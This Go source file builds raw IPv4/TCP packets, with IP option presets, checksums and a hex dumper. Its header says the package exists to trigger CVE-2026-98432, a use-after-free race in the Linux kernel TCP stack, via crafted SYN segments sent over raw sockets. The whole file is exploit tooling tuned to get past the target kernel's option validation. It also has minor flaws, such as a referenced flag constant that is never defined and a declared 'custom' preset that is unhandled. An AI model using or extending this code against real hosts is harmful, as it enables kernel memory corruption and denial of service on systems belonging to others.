// Package packet builds raw IPv4/TCP segments used to trigger
// CVE-2026-98432 (use-after-free of ireq_opt/inet_opt during a
// retransmitted-SYN race in the Linux kernel TCP stack).
//
// The builder is pure Go: it produces the complete IP datagram
// (including IP options) and the TCP segment with correctly
// computed checksums, so the sender can transmit it verbatim
// through a SOCK_RAW socket with IP_HDRINCL.
package packet

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
)

// TCP flag bits (RFC 9293).
const (
	FlagURG = 0x20
	FlagACK = 0x10
	FlagPSH = 0x08
	FlagRST = 0x04
	FlagSYN = 0x02
	FlagFIN = 0x01
)

// IPOption kind values exactly as the Linux kernel defines them in
// include/uapi/linux/ip.h (IPOPT_CONTROL=0x00, IPOPT_COPY=0x80,
// IPOPT_MEASUREMENT=0x40). Verified against a live kernel via
// setsockopt(IP_OPTIONS): all presets below are accepted.
const (
	IPOptEnd  = 0x00
	IPOptNOP  = 0x01
	IPOptRR   = 0x07 // record route
	IPOptLSRR = 0x83 // loose source route
	IPOptSSRR = 0x89 // strict source route (9 | IPOPT_COPY)
	IPOptTS   = 0x44 // timestamp (4 | IPOPT_MEASUREMENT)
)

// Option presets. The kernel validates option syntax when a SYN
// arrives (ip_options_get -> ip_options_compile); a rejected option
// means no request socket and therefore no race. All presets are
// verified against the live-kernel compile rules:
//
//	Timestamp: len>=4, byte2>=5, byte2<=len, len>=byte2+3,
//	byte3&0xF in {0=TSONLY, 1=TSANDADDR, 3=PRESPEC}.
//	SSRR: byte2==4, len>=7, (len-3)%4==0.
//	RR: byte2>=4; if byte2<=len then len>=byte2+3.
const (
	PresetNOP    = "nop"  // 4x NOP (4 bytes)
	PresetTS     = "ts"   // timestamp(T) TSANDADDR (12 bytes)
	PresetRR     = "rr"   // record route (8 bytes)
	PresetSSRR   = "ssrr" // strict source route (8 bytes)
	PresetCustom = "custom"
)

// Seg is the complete description of one TCP segment the tool
// will put on the wire.
type Seg struct {
	SrcIP      net.IP
	DstIP      net.IP
	SrcPort    uint16
	DstPort    uint16
	IPID       uint16
	TOS        uint8
	TTL        uint8
	IPFlags    uint16 // e.g. FlagDF | FlagMF
	TCPFlags   byte
	Seq        uint32
	Ack        uint32
	Window     uint16
	IPOptions  []byte // must be 0 or a multiple of 4 bytes
	TCPOptions []byte // MSS/SACK/WS + padding as needed
}

// Common TCP option blocks (RFC 7323 / 2018).
var (
	// MSS=1460 (4B), SACK permitted (2B), Window Scale=7 (3B) = 9B,
	// padded with 3 NOP to 12 (a multiple of 4, as the TCP data
	// offset requires).
	TCPCommonOptions []byte = []byte{
		0x02, 0x04, 0x05, 0xB4, // MSS 1460
		0x04, 0x02, // SACK permitted
		0x03, 0x03, 0x07, // WScale 7
		0x01, 0x01, 0x01, // NOP NOP NOP (pad to 12)
	}
)

// BuildIPOptions renders the requested preset into raw IP option
// bytes (multiple of 4).
func BuildIPOptions(preset string, srcIP net.IP) ([]byte, error) {
	var opt []byte
	// Case-insensitive: config values may arrive capitalized from
	// TOML or the CLI.
	switch strings.ToLower(preset) {
	case PresetNOP:
		opt = []byte{IPOptNOP, IPOptNOP, IPOptNOP, IPOptNOP}
	case PresetTS:
		// timestamp(T) / TSANDADDR, 12 bytes. Kernel layout:
		// [kind=0x44, len=12, ptr=5, fmt=1 (TSANDADDR), data(8)];
		// the kernel itself fills the address/time fields.
		opt = []byte{IPOptTS, 0x0C, 0x05, 0x01,
			0, 0, 0, 0,
			0, 0, 0, 0}
	case PresetRR:
		// record route with one free slot:
		// [kind=0x07, len=7, ptr=4, slot(4)] + NOP pad.
		opt = []byte{IPOptRR, 0x07, 0x04,
			0, 0, 0, 0,
			IPOptNOP}
	case PresetSSRR:
		// strict source route, single hop:
		// [kind=0x89, len=7, ptr=4, addr(4)] + NOP pad.
		a := srcIP.To4()
		if a == nil {
			a = []byte{0, 0, 0, 0}
		}
		opt = []byte{IPOptSSRR, 0x07, 0x04,
			a[0], a[1], a[2], a[3],
			IPOptNOP}
	default:
		return nil, fmt.Errorf("unknown ip-options preset %q", preset)
	}
	return opt, nil
}

// ParseIPOptionsHex converts "aa:bb:cc" or "aabbcc" into bytes.
func ParseIPOptionsHex(s string) ([]byte, error) {
	h := make([]byte, 0, len(s)/2)
	n := 0 // count of real hex digits (separators don't shift parity)
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= '0' && c <= '9':
			c -= '0'
		case c >= 'a' && c <= 'f':
			c -= 'a' - 10
		case c >= 'A' && c <= 'F':
			c -= 'A' - 10
		case c == ':' || c == ' ' || c == '-' || c == '.':
			continue
		default:
			return nil, fmt.Errorf("bad hex character %q in %q", c, s)
		}
		if n%2 == 0 {
			h = append(h, c<<4)
		} else {
			h[len(h)-1] |= c
		}
		n++
	}
	if n%2 != 0 {
		return nil, fmt.Errorf("odd number of hex digits in %q", s)
	}
	return h, nil
}

func ipHeaderLen(optLen int) int {
	ihl := (20 + optLen) / 4
	return ihl * 4
}

// Validate checks internal consistency of the segment description.
func (s *Seg) Validate() error {
	if s.SrcIP == nil || s.SrcIP.To4() == nil {
		return errors.New("source IP must be a valid IPv4 address")
	}
	if s.DstIP == nil || s.DstIP.To4() == nil {
		return errors.New("destination IP must be a valid IPv4 address")
	}
	if s.DstPort == 0 {
		return errors.New("destination port must be non-zero")
	}
	if len(s.IPOptions) > 0 && len(s.IPOptions)%4 != 0 {
		return fmt.Errorf("ip options length %d must be a multiple of 4", len(s.IPOptions))
	}
	if len(s.IPOptions) > 40 {
		return errors.New("ip options longer than 40 bytes (IHL limit)")
	}
	if len(s.TCPOptions)%4 != 0 {
		return fmt.Errorf("tcp options length %d must be a multiple of 4 (data offset alignment)", len(s.TCPOptions))
	}
	if len(s.TCPOptions) > 40 {
		return errors.New("tcp options longer than 40 bytes")
	}
	if s.TTL == 0 {
		return errors.New("TTL must be non-zero")
	}
	return nil
}

// Checksum16 computes the internet checksum (RFC 1071) over b and
// returns its one's complement.
func Checksum16(b []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(b); i += 2 {
		sum += uint32(b[i])<<8 | uint32(b[i+1])
	}
	if len(b)%2 == 1 {
		sum += uint32(b[len(b)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

// tcpChecksum computes the TCP checksum over the segment using the
// IPv4 pseudo-header (RFC 793 / RFC 9293).
func tcpChecksumPseudo(src, dst []byte, seg []byte) uint16 {
	pseudo := make([]byte, 0, 12+len(seg))
	pseudo = append(pseudo, src...)
	pseudo = append(pseudo, dst...)
	pseudo = append(pseudo, 0x00, 0x06)
	var l [2]byte
	binary.BigEndian.PutUint16(l[:], uint16(len(seg)))
	pseudo = append(pseudo, l[:]...)
	pseudo = append(pseudo, seg...)
	return Checksum16(pseudo)
}

func tcpChecksum(src, dst net.IP, seg []byte) uint16 {
	return tcpChecksumPseudo(src.To4(), dst.To4(), seg)
}

// Rechecksum recomputes both the IP and the TCP checksum in place.
// Call it after patching mutable fields (IP ID, src port, seq):
// a SOCK_RAW/IP_HDRINCL send transmits the bytes as-is, and the
// target kernel verifies both checksums.
func Rechecksum(pkt []byte) {
	ihl := int(pkt[0]&0x0F) * 4
	binary.BigEndian.PutUint16(pkt[10:12], 0)
	binary.BigEndian.PutUint16(pkt[10:12], Checksum16(pkt[:ihl]))
	binary.BigEndian.PutUint16(pkt[ihl+16:ihl+18], 0)
	binary.BigEndian.PutUint16(pkt[ihl+16:ihl+18], tcpChecksumPseudo(pkt[12:16], pkt[16:20], pkt[ihl:]))
}

// Build renders the complete IP datagram (header + options + TCP
// segment) with IP and TCP checksums filled in.
func (s *Seg) Build() ([]byte, error) {
	if err := s.Validate(); err != nil {
		return nil, err
	}
	tcpLen := 20 + len(s.TCPOptions)
	ipLen := 20 + len(s.IPOptions) + tcpLen
	pkt := make([]byte, 0, ipLen)

	// ---- IP header ----
	ihl := ipHeaderLen(len(s.IPOptions)) / 4
	var iph [20]byte
	iph[0] = 0x40 | byte(ihl)
	iph[1] = s.TOS
	binary.BigEndian.PutUint16(iph[2:4], uint16(ipLen))
	binary.BigEndian.PutUint16(iph[4:6], s.IPID)
	binary.BigEndian.PutUint16(iph[6:8], s.IPFlags)
	iph[8] = s.TTL
	iph[9] = 6 // IPPROTO_TCP
	// checksum left zero
	copy(iph[12:16], s.SrcIP.To4())
	copy(iph[16:20], s.DstIP.To4())
	pkt = append(pkt, iph[:]...)
	pkt = append(pkt, s.IPOptions...)

	// ---- TCP header + options ----
	var t [20]byte
	binary.BigEndian.PutUint16(t[0:2], s.SrcPort)
	binary.BigEndian.PutUint16(t[2:4], s.DstPort)
	binary.BigEndian.PutUint32(t[4:8], s.Seq)
	binary.BigEndian.PutUint32(t[8:12], s.Ack)
	t[12] = byte((20+len(s.TCPOptions))>>2) << 4
	t[13] = s.TCPFlags
	binary.BigEndian.PutUint16(t[14:16], s.Window)
	// checksum + urgent left zero
	pkt = append(pkt, t[:]...)
	pkt = append(pkt, s.TCPOptions...)

	// ---- checksums ----
	// IP checksum covers the whole header INCLUDING options
	// (RFC 791; kernel: ip_fast_csum(iph, iph->ihl)). Routers
	// that modify options (e.g. RR) must recompute it.
	binary.BigEndian.PutUint16(pkt[10:12], Checksum16(pkt[:ihl*4]))
	tcpStart := 20 + len(s.IPOptions)
	ck := tcpChecksum(s.SrcIP, s.DstIP, pkt[tcpStart:])
	binary.BigEndian.PutUint16(pkt[tcpStart+16:tcpStart+18], ck)
	return pkt, nil
}

// HexFormat renders raw bytes as "aa bb cc ..." lines of n bytes.
func HexFormat(b []byte, n int) string {
	if n <= 0 {
		n = 16
	}
	var out []string
	for i := 0; i < len(b); i += n {
		end := i + n
		if end > len(b) {
			end = len(b)
		}
		var line []string
		for _, c := range b[i:end] {
			line = append(line, fmt.Sprintf("%02x", c))
		}
		out = append(out, join(line))
	}
	return joinLines(out)
}

func join(a []string) string {
	s := ""
	for i, v := range a {
		if i > 0 {
			s += " "
		}
		s += v
	}
	return s
}

func joinLines(a []string) string {
	s := ""
	for i, v := range a {
		if i > 0 {
			s += "\n"
		}
		s += v
	}
	return s
}

// Summary returns a human-readable one-line description of the segment.
func (s *Seg) Summary() string {
	kind := "TCP"
	if s.TCPFlags&FlagSYN != 0 {
		kind = "SYN"
	}
	if s.TCPFlags&FlagACK != 0 && s.TCPFlags&FlagSYN != 0 {
		kind = "SYN-ACK"
	}
	if s.TCPFlags&FlagRST != 0 {
		kind = "RST"
	}
	if s.TCPFlags&FlagFIN != 0 {
		kind = "FIN"
	}
	return fmt.Sprintf("%s %s:%d -> %s:%d seq=%d ipopt=%dB tcpipt=%dB ttl=%d",
		kind, s.SrcIP, s.SrcPort, s.DstIP, s.DstPort, s.Seq, len(s.IPOptions), len(s.TCPOptions), s.TTL)
}
